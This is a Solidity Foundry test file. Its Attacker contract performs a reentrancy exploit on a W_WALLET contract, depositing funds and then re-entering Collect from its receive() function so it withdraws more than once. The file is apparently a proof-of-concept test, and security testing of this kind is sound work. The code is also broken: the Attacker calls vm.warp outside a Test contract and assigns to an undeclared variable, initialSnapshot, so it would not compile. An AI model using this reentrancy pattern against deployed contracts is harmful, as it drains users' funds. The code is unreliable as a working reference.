
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET} from "../src/W_WALLET.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyW_WALLET is Test {
    W_WALLET public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new W_WALLET(address(log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);
        
        uint256 initialDeposit = attackVal * 2;
        
        vm.deal(address(_attacker), initialDeposit);
        vm.deal(address(this), initialDeposit);

        _attacker.setupAttack{value: initialDeposit}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.Put{value: msg.value}(0);
        
        vm.warp(block.timestamp + 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        _victim.Collect(val);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
